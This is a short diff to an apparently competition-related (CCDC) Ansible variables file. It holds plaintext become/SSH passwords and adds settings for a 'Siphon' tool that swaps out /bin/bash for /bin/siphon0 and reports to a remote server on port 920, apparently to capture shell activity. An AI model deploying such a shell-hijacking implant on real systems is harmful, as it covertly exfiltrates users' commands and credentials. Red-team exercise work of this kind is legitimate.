@@ -7,3 +7,11 @@ ansible_password: ccdc
 ansible_become: yes 
 ansible_become_method: sudo
 ansible_become_pass: ccdc
+
+# Siphon
+siphon_file_old_path: "/bin/bash"
+siphon_file_new_path: "/bin/ash"
+siphon_path: "/bin/siphon0"
+siphon_logfile_path: "/output"
+siphon_server_ip: "{{ hostvars['siphoner_server']['ansible_host'] }}"
+siphon_server_port: "920"
